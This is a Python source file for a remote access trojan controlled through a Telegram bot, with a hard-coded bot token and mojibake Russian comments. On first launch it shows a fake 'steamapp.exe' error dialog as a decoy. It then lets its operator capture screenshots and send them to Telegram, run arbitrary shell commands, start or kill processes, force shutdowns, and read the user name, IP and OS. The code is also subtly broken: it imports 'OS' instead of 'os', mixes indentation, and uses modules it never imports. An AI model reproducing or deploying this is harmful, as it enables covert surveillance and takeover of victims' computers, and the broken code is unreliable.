import telebot
import requests
import platform
import ctypes
import PIL.ImageGrab
import cv2
import OS
from PIL import Image, ImageGrab, ImageDraw
from pySmartDL import SmartDL
from telebot import types
from telebot import apihelper

my_id = 6091346175 #ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Ç–µ–ª–µ–≥–∏
bot_token = '7139763243:AAHmkGOsPrdWmfw8DXet-1Fap-jWPNr_8o0' #—Ç–æ–∫–µ–Ω –±–æ—Ç–∞ , –ø–æ–ª—É—á–∞–µ—Ç—Å—è –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –≤ –±–æ—Ç–µ @BotFather
bot = telebot.TeleBot(bot_token)

class User:
	def __init__(self):
		keys = ['urldown', 'fin', 'curs']

		for key in keys:
			self.key = None

User.curs = 50


##–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –º–µ–Ω—é
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnscreen = types.KeyboardButton('üì∑–ë—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç') #—Å–∫—Ä–∏–Ω +- –≤ 720P
btnscreendoc = types.KeyboardButton('üñº–ü–æ–ª–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç') #—Å–∫—Ä–∏–Ω—à–æ—Ç –≤ –æ—Ç–ª–∏—á–Ω–æ–º –∫–∞—á–µ—Å—Ç–≤–µ
btnwebcam = types.KeyboardButton('üìπ–§–æ—Ç–æ –≤–µ–±–∫–∞–º–µ—Ä—ã')
btnmouse = types.KeyboardButton('üñ±–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π')
btnfiles = types.KeyboardButton('üìÇ–§–∞–π–ª—ã –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã')
btnaddit = types.KeyboardButton('‚ùáÔ∏è–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ')
btnmsgbox = types.KeyboardButton('üì©–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è')
btninfo = types.KeyboardButton('‚ùóÔ∏è–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
menu_keyboard.row(btnscreen, btnscreendoc)
menu_keyboard.row(btnwebcam)
menu_keyboard.row(btnfiles, btnaddit)
menu_keyboard.row(btninfo, btnmsgbox)


#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –§–∞–π–ª—ã –∏ –ü—Ä–æ—Ü–µ—Å—Å—ã
files_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnstart = types.KeyboardButton('‚úîÔ∏è–ó–∞–ø—É—Å—Ç–∏—Ç—å')
btnkill = types.KeyboardButton('‚ùå–ó–∞–º–æ—á–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å')
btnback = types.KeyboardButton('‚è™–ù–∞–∑–∞–¥‚è™')
files_keyboard.row(btnstart,  btnkill)
files_keyboard.row(btnback)


#–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ
additionals_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btncmd = types.KeyboardButton('‚úÖ–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É')
btnoff = types.KeyboardButton('‚õîÔ∏è–í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä')
btnreb = types.KeyboardButton('‚ôªÔ∏è–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä')
btnback = types.KeyboardButton('‚è™–ù–∞–∑–∞–¥‚è™')
additionals_keyboard.row(btnoff, btnreb)
additionals_keyboard.row(btncmd)
additionals_keyboard.row(btnback)

#–Ω–∞–≤–∏–≥–∞—Ü–∏—è
info_msg = '''    
*–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã*
_üì∑–ë—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç_ - –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞
_üñº–ü–æ–ª–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç_ - –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞ –±–µ–∑ —Å–∂–∞—Ç–∏—è
_‚ùáÔ∏è–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ_ - –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –≤ –º–µ–Ω—é —Å –¥–æ–ø. —Ñ—É–Ω–∫—Ü–∏—è–º–∏
_üì©–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è_ - –ø—Ä–∏—à–ª–µ—Ç –Ω–∞ –ü–ö –æ–∫–Ω–æ —Å —Å–æ–æ–±—â–µ–Ω–∏–µ–º(msgbox)
_‚è™–ù–∞–∑–∞–¥‚è™_ - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
_‚úÖ–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É_ - –≤—ã–ø–æ–ª–Ω—è–µ—Ç –≤ cmd –ª—é–±—É—é —É–∫–∞–∑–∞–Ω–Ω—É—é –∫–æ–º–∞–Ω–¥—É
_‚õîÔ∏è–í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä_ - –º–æ–º–µ–Ω—Ç–∞–ª—å–Ω–æ –≤—ã–∫–ª—é—á–∞–µ—Ç –∫–æ–º–ø—å—é—Ç–µ—Ä
_‚ôªÔ∏è–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä_ - –º–æ–º–µ–Ω—Ç–∞–ª—å–Ω–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç –∫–æ–º–ø—å—é—Ç–µ—Ä

_‚ùå–ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ—Ü–µ—Å—Å_ - –∑–∞–≤–µ—Ä—à–∞–µ—Ç –ª—é–±–æ–π –ø—Ä–æ—Ü–µ—Å—Å
_‚úîÔ∏è–ó–∞–ø—É—Å—Ç–∏—Ç—å_ - –∑–∞–ø—É—Å–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π(–≤ —Ç–æ–º —á–∏—Å–ª–µ –∏ exe)
'''

MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
	pass
else:
	bot.send_message(my_id, "–ë–æ—Ç, –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–Ω—ã–π –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ü–ö –¥–∏—Å—Ç–∞–Ω—Ü–∏–æ–Ω–Ω–æ")
	MessageBox(None, f'steamapp.exe\n–û—à–∏–±–∫–∞', 0)
	f = open('msg.pt', 'tw', encoding='utf-8')
	f.close

bot.send_message(my_id, "PC online", reply_markup = menu_keyboard)


@bot.message_handler(content_types=["text"])
def get_text_messages(message):
	if message.from_user.id == my_id:
		if message.text == "üì∑–ë—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç":
			bot.send_chat_action(my_id, 'upload_photo')
			try:
				get_screenshot()
				bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
				os.remove("screen.png")
				os.remove("screen_with_mouse.png")
			except:
				bot.send_message(my_id, "–ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")
		
		elif message.text == "üñº–ü–æ–ª–Ω—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç":
			bot.send_chat_action(my_id, 'upload_document')
			try:
				get_screenshot()
				bot.send_document(my_id, open("screen_with_mouse.png", "rb"))
				os.remove("screen.png")
				os.remove("screen_with_mouse.png")
			except:
				bot.send_message(my_id, "–ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")

		elif message.text == "‚è™–ù–∞–∑–∞–¥‚è™":
			back(message)

		elif message.text == "üìÇ–§–∞–π–ª—ã –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã":
			bot.send_message(my_id, "üìÇ–§–∞–π–ª—ã –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã", reply_markup = files_keyboard)
			bot.register_next_step_handler(message, files_process)
		
		elif message.text == "‚ùáÔ∏è–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ":
			bot.send_message(my_id, "‚ùáÔ∏è–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ", reply_markup = additionals_keyboard)
			bot.register_next_step_handler(message, addons_process)

		elif message.text == "üì©–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è":
			bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ —Ç–µ–∫—Å—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:")
			bot.register_next_step_handler(message, messaga_process)

		else:
			pass
	else:
		info_user(message)


def addons_process(message):
	if message.from_user.id == my_id:
		bot.send_chat_action(my_id, 'typing')
		if message.text == "üîó–ü–µ—Ä–µ–π—Ç–∏ –ø–æ —Å—Å—ã–ª–∫–µ":
			bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ —Å—Å—ã–ª–∫—É: ")
			bot.register_next_step_handler(message, web_process)

		elif message.text == "‚úÖ–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É":
			bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ –∫–æ–Ω—Å–æ–ª—å–Ω—É—é –∫–æ–º–∞–Ω–¥—É: ")
			bot.register_next_step_handler(message, cmd_process)

		elif message.text == "‚õîÔ∏è–í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä":
			bot.send_message(my_id, "–í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
			os.system('shutdown -s /t 0 /f')
			bot.register_next_step_handler(message, addons_process)
		
		elif message.text == "‚ôªÔ∏è–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä":
			bot.send_message(my_id, "–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...")
			os.system('shutdown -r /t 0 /f')
			bot.register_next_step_handler(message, addons_process)
                elif message.text == "üñ•–û –ü–ö":
			req = requests.get('http://ip.42.pl/raw')
			ip = req.text
			uname = os.getlogin()
			windows = platform.platform()
			processor = platform.processor()
			bot.send_message(my_id, f"*–¢–µ–∫—É—â–∏–π —é–∑–µ—Ä, –≤–æ—à–µ–¥—à–∏–π –≤ —Å–∏—Å—Ç–µ–º—É:* {uname}\n*IP:* {ip}\n*–û–°:* {windows}\n*–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:* {processor}", parse_mode = "markdown")
			bot.register_next_step_handler(message, addons_process)

		elif message.text == "‚è™–ù–∞–∑–∞–¥‚è™":
			back(message)
		else:
			pass
	else:
		info_user(message)


def files_process(message):
	if message.from_user.id == my_id:
		bot.send_chat_action(my_id, 'typing')
		if message.text == "‚ùå–ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ—Ü–µ—Å—Å":	
			bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞: ")
			bot.register_next_step_handler(message, kill_process)

		elif message.text == "‚úîÔ∏è–ó–∞–ø—É—Å—Ç–∏—Ç—å":
			bot.send_message(my_id, "–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞: ")
			bot.register_next_step_handler(message, start_process)

		elif message.text == "‚è™–ù–∞–∑–∞–¥‚è™":
			back(message)
		else:
			pass
	else:
		info_user(message)

def back(message):
	bot.register_next_step_handler(message, get_text_messages)
	bot.send_message(my_id, "–í—ã –≤ –≥–ª–∞–≤–Ω–æ–º –º–µ–Ω—é", reply_markup = menu_keyboard)

def info_user(message):
	bot.send_chat_action(my_id, 'typing')
	alert = f"–ö—Ç–æ-—Ç–æ –ø—ã—Ç–∞–ª—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É: \"{message.text}\"\n\n"
	alert += f"user id: {str(message.from_user.id)}\n"
	alert += f"first name: {str(message.from_user.first_name)}\n"
	alert += f"last name: {str(message.from_user.last_name)}\n" 
	alert += f"username: @{str(message.from_user.username)}"
	bot.send_message(my_id, alert, reply_markup = menu_keyboard)

def kill_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.system("taskkill /IM " + message.text + " -F")
		bot.send_message(my_id, f"–ü—Ä–æ—Ü–µ—Å—Å \"{message.text}\" —Å–Ω—è—Ç", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "–ü—Ä–æ—Ü–µ—Å—Å –Ω–µ –Ω–∞–π–¥–µ–Ω", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def start_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.startfile(r'' + message.text)
		bot.send_message(my_id, f"–§–∞–π–ª –ø–æ –ø—É—Ç–∏ \"{message.text}\" –∑–∞–ø—É—â–µ–Ω", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "–û—à–∏–±–∫–∞! –£–∫–∞–∑–∞–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–∞–π–ª", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def web_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		webbrowser.open(message.text, new=0)
		bot.send_message(my_id, f"–ü–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ \"{message.text}\" –æ—Å—É—â–µ—Å—Ç–≤–ª—ë–Ω", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(my_id, "–û—à–∏–±–∫–∞! —Å—Å—ã–ª–∫–∞ –≤–≤–µ–¥–µ–Ω–∞ –Ω–µ–≤–µ—Ä–Ω–æ")
		bot.register_next_step_handler(message, addons_process)

def cmd_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.system(message.text)
		bot.send_message(my_id, f"–ö–æ–º–∞–Ω–¥–∞ \"{message.text}\" –≤—ã–ø–æ–ª–Ω–µ–Ω–∞", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(my_id, "–û—à–∏–±–∫–∞! –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞")
		bot.register_next_step_handler(message, addons_process)

def say_process(message):
	bot.send_chat_action(my_id, 'typing')
	bot.send_message(my_id, "–í —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ...", reply_markup = menu_keyboard)

def messaga_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		MessageBox(None, message.text, 'PC TOOL', 0)
		bot.send_message(my_id, f"–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Å —Ç–µ–∫—Å—Ç–æ–º \"{message.text}\" –±—ã–ª–æ –∑–∞–∫—Ä—ã—Ç–æ")
	except:
		bot.send_message(my_id, "–û—à–∏–±–∫–∞")

def screen_process(message):
	try:
		get_screenshot()
		bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
		bot.register_next_step_handler(message, mouse_process)
		os.remove("screen.png")
		os.remove("screen_with_mouse.png")
	except:
			bot.send_chat_action(my_id, 'typing')
			bot.send_message(my_id, "–ö–æ–º–ø—å—é—Ç–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω")
			bot.register_next_step_handler(message, mouse_process)
	
def get_screenshot():
	currentMouseX, currentMouseY  =  mouse.get_position()
	img = PIL.ImageGrab.grab()
	img.save("screen.png", "png")
	img = Image.open("screen.png")
	draw = ImageDraw.Draw(img)
	draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 20, currentMouseX + 13, currentMouseY + 13), fill="white", outline="black")
	img.save("screen_with_mouse.png", "PNG")

def is_digit(string):
	if string.isdigit():
		return True
	else:
		try:
			float(string)
			return True
		except ValueError:
			return False


#while True:
#	try:
bot.polling(none_stop=True, interval=0, timeout=20)
#	except Exception as E:
#		print(E.args)
#		time.sleep(2)
